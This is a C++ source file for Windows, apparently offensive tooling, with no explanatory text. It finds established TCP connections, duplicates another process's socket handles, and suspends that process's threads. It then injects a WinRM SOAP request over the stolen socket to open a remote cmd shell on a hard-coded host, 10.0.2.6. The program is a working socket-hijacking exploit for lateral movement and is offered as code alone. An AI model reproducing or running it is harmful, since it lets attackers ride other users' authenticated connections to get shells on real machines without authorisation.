#include <WinSock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <string.h>
#include <processthreadsapi.h>
#include <stdlib.h>
#include <WS2tcpip.h>
#include <sstream>
#include <TlHelp32.h>
#include <combaseapi.h>
#include <namedpipeapi.h>

#pragma comment(lib,"iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"Ole32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

#define NT_SUCCESS(x) ((signed int)(x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(ULONG SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(HANDLE SourceProcessHandle,HANDLE SourceHandle,HANDLE TargetProcessHandle,PHANDLE TargetHandle,ACCESS_MASK DesiredAccess,ULONG Attributes,ULONG Options);
typedef NTSTATUS(NTAPI* _NtQueryObject)(HANDLE ObjectHandle,ULONG ObjectInformationClass,PVOID ObjectInformation,ULONG ObjectInformationLength,PULONG ReturnLength);

typedef struct _UNICODE_STRING{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _SYSTEM_HANDLE{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
typedef enum _POOL_TYPE{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;
typedef struct _OBJECT_TYPE_INFORMATION{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

SOCKET sockets; 
std::string getconnectionstatus(DWORD state) {
	switch (state) {
		case MIB_TCP_STATE_CLOSED:
			return "CLOSED";
			break;
		case MIB_TCP_STATE_LISTEN:
			return "LISTEN";
			break;
		case MIB_TCP_STATE_SYN_SENT:
			return "SYN_SENT";
			break;
		case MIB_TCP_STATE_SYN_RCVD:
			return "SYN_RECEIVED";
			break;
		case MIB_TCP_STATE_ESTAB:
			return "ESTABLISHED";
			break;
		case MIB_TCP_STATE_FIN_WAIT1:
			return "FIN-WAIT-1";
			break;
		case MIB_TCP_STATE_FIN_WAIT2:
			return "FIN-WAIT-2";
			break;
		case MIB_TCP_STATE_CLOSE_WAIT:
			return "CLOSE-WAIT";
			break;
		case MIB_TCP_STATE_CLOSING:
			return "CLOSING";
			break;
		case MIB_TCP_STATE_LAST_ACK:
			return "LAST-ACK";
			break;
		case MIB_TCP_STATE_TIME_WAIT:
			return "TIME-WAIT";
			break;
		case MIB_TCP_STATE_DELETE_TCB:
			return "DELETE-TCB";
			break;
		default:
			return "UNKNOWN";
			break;
	}
}
std::string getoffloadstate(DWORD state) {
	switch (state) {
	case TcpConnectionOffloadStateInHost:
		return "Owned by the networkstack and not offloaded";
		break;
	case TcpConnectionOffloadStateOffloading:
		return "In the process of being offloaded";
		break;
	case TcpConnectionOffloadStateOffloaded:
		return "Offloaded to the network interface control";
		break;
	case TcpConnectionOffloadStateUploading:
		return "in the process of being uploaded back th the network stack";
		break;
	default:
		return "unknown offload state";
		break;
	}
}
bool socketduplicate(DWORD pid) {
	_NtQuerySystemInformation NtQuerySystemInformation =(_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =(_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject");
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject");

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle;
	ULONG i;
	if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid))) {
		std::cout << "OpenProcess() " << GetLastError() << std::endl;
		return false;
	}
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	}
	if (!NT_SUCCESS(status)) {
		std::cout << "NtQuerySystemInformation() " << status<< std::endl;
		return false;
	}
	for (i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo;
		PVOID objectNameInfo;
		UNICODE_STRING objectName;
		ULONG returnLength;
		if (handle.ProcessId != pid && handle.ObjectTypeNumber==0x24) {
			continue;
		}
		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (void*)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0))) {
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL))) {
			CloseHandle(dupHandle);
			continue;
		}
		if (handle.GrantedAccess == 0x0012019f) {
			//printf("[%#x] %.*S: (did not get name)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
			free(objectTypeInfo);
			CloseHandle(dupHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle,ObjectNameInformation,objectNameInfo,0x1000,&returnLength))) {
			objectNameInfo = realloc(objectNameInfo, returnLength);
			if (!NT_SUCCESS(NtQueryObject(dupHandle,ObjectNameInformation,objectNameInfo,returnLength,NULL))) {
				//printf("[%#x] %.*S: (could not get name)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				continue;
			}
		}
		objectName = *(PUNICODE_STRING)objectNameInfo;			
		if (objectName.Length && wcsncmp(L"\\Device\\Afd", objectName.Buffer, objectName.Length / sizeof(WCHAR)) == 0) {
			//printf("[%#x] %.*S: %.*S\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer,objectName.Length / 2,objectName.Buffer);
			WSADATA wsaData;
			WSAStartup(MAKEWORD(2, 2), &wsaData);
			WSAPROTOCOL_INFOW lpProtocolInfo;
			if ((WSADuplicateSocketW((SOCKET)dupHandle, GetCurrentProcessId(), &lpProtocolInfo)) != SOCKET_ERROR) {
				sockets = WSASocketW(lpProtocolInfo.iAddressFamily, lpProtocolInfo.iSocketType, lpProtocolInfo.iProtocol, &lpProtocolInfo, 0, 0);
				if (sockets != INVALID_SOCKET) {
					return true;
				}
				else {
					std::cout << "WSASocketW() " << WSAGetLastError() << std::endl;
				}
			}
			else {
				std::cout << "WSADuplicateSocketW() " << WSAGetLastError() << std::endl;
			}
		}		
		free(objectTypeInfo);
		free(objectNameInfo);
		CloseHandle(dupHandle);		
	}
	return false;
}
void suspend(DWORD processId,bool suspend){
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	Thread32First(hThreadSnapshot, &threadEntry);
	do{
		if (threadEntry.th32OwnerProcessID == processId){
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,threadEntry.th32ThreadID);
			if (suspend) {
				SuspendThread(hThread);
			}
			else {
				ResumeThread(hThread);
			}			
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnapshot, &threadEntry));
	CloseHandle(hThreadSnapshot);
}
GUID generateGUID() {
	GUID guid;
	CoCreateGuid(&guid);
	return guid;
}
std::string GuidToString(GUID guid){
	char guid_cstr[39];
	snprintf(guid_cstr, sizeof(guid_cstr),
		"%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
		guid.Data1, guid.Data2, guid.Data3,
		guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
		guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);	
	return std::string(guid_cstr);
}

void sendpayload(SOCKET s,DWORD pid) {
	DWORD sessionid;
	ProcessIdToSessionId(pid, &sessionid);
	std::cout << sessionid << std::endl;
	suspend(pid, true);
	std::string data="<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:a='http://schemas.xmlsoap.org/ws/2004/08/addressing' xmlns:w='http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd' xmlns:p='http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd'><s:Header><a:To>http://10.0.2.6:5985/wsman</a:To><w:ResourceURI s:mustUnderstand='true'>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI><a:ReplyTo><a:Address s:mustUnderstand='true'>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo><a:Action s:mustUnderstand='true'>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:MaxEnvelopeSize s:mustUnderstand='true'>512000</w:MaxEnvelopeSize><a:MessageID>uuid:AF8B4685-317F-4D85-8A88-7ECC96AA9503</a:MessageID><w:Locale xml:lang='en-US' s:mustUnderstand='false' /><p:DataLocale xml:lang='en-US' s:mustUnderstand='false' /><p:SessionId s:mustUnderstand='false'>uuid:748A2091-7F13-4AC5-A9D9-B39691D55E47</p:SessionId><p:OperationID s:mustUnderstand='false'>uuid:723DD0EB-3DC6-4921-B5DF-F6E0FE28C901</p:OperationID><p:SequenceId s:mustUnderstand='false'>1</p:SequenceId><w:SelectorSet><w:Selector Name='ShellId'>284AA3AB-62DB-46BA-8029-DF7A95363DA1</w:Selector></w:SelectorSet><w:OptionSet xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><w:Option Name='WINRS_CONSOLEMODE_STDIN'>TRUE</w:Option></w:OptionSet><w:OperationTimeout>PT60.000S</w:OperationTimeout></s:Header><s:Body><rsp:CommandLine xmlns:rsp='http://schemas.microsoft.com/wbem/wsman/1/windows/shell'><rsp:Command>cmd</rsp:Command></rsp:CommandLine></s:Body></s:Envelope>";
	std::ostringstream ss;
	ss << "POST /wsman HTTP/1.1\n";
	ss << "Connection: Keep-Alive\n";
	ss << "Content-Type: application/soap+xml;charset=UTF-8\n";
	ss << "User-Agent: Microsoft WinRm Client \n";
	ss << "Content-Length: " << data.size()<<"\n";
	ss << "Host: 10.0.2.6:5985 \r\n\r\n";

	ss << data;
		send(s, ss.str().data(), ss.str().size(), 0);

		char response[512];
		int result;
		do {
			result=recv(s, response, 512, 0);
			if (result == 0) {
				std::cout << "Connection closed" << std::endl;
			}
			else if (result > 0) {
				std::cout << response << std::endl;
			}
			else {
				std::cout << "recv() :" << WSAGetLastError() << std::endl;
			}
		} while (result > 0);
		
	suspend(pid, false);	
}
int main() {
	const char* targetAddress = "10.0.2.6";
	PMIB_TCPTABLE2 ptcptable;
	ptcptable = (MIB_TCPTABLE2*)MALLOC(sizeof(MIB_TCPTABLE2));
	if (ptcptable == NULL) {
		std::cout << "Error allocating memory1 " << GetLastError() << std::endl;
		return 1;
	}
	ULONG ulsize = sizeof(MIB_TCPTABLE);
	DWORD returnval = 0;
	if ((returnval=GetTcpTable2(ptcptable,&ulsize,TRUE))==ERROR_INSUFFICIENT_BUFFER) {
		FREE(ptcptable);
		ptcptable = (MIB_TCPTABLE2*)MALLOC(ulsize);
		if (ptcptable == NULL) {
			std::cout << "Error allocating memory2 " << GetLastError() << std::endl;
			return 1;
		}
	}
	if ((returnval = GetTcpTable2(ptcptable, &ulsize, TRUE)) == NO_ERROR) {
		//std::cout << "Number of entries " << (int)ptcptable->dwNumEntries << std::endl;
		char szLocalAddr[128];
		char szRemoteAddr[128];
		for (int i = 0;i < (int)ptcptable->dwNumEntries;i++) {
			inet_ntop(AF_INET,&ptcptable->table[i].dwRemoteAddr, szRemoteAddr, sizeof(szRemoteAddr));
			if (ptcptable->table[i].dwState == MIB_TCP_STATE_ESTAB/* && strcmp(szRemoteAddr,targetAddress)==0*/) {
				std::cout << i << " State: " << getconnectionstatus(ptcptable->table[i].dwState) << std::endl;
				inet_ntop(AF_INET,&ptcptable->table[i].dwLocalAddr,szLocalAddr,sizeof(szLocalAddr));
				std::cout << "LocalAddress:" << szLocalAddr << " LocalPort:" << ntohs((u_short)ptcptable->table[i].dwLocalPort) << " PID:" << ptcptable->table[i].dwOwningPid << std::endl;				
				std::cout << "RemoteAddress:" << szRemoteAddr << " RemotePort:" << ntohs((u_short)ptcptable->table[i].dwRemotePort) << std::endl;
				std::cout << "OffloadState:" << getoffloadstate(ptcptable->table[i].dwOffloadState)<< std::endl;			
				if (socketduplicate(ptcptable->table[i].dwOwningPid)) {
					std::cout << "[+]Socket duplication was successful" << std::endl;					
					sendpayload(sockets, ptcptable->table[i].dwOwningPid);
					
				}
				else {
					std::cout << "[-]Socket duplication failed" << std::endl;
				}
				std::cout << std::endl;
			}			
		}
	}
	else {
		std::cout << "GetTcpTable2() " << GetLastError() << std::endl;
		FREE(ptcptable);
	}
	if (ptcptable != NULL) {
		FREE(ptcptable);
		ptcptable = NULL;
	}
	
	return 0;
}
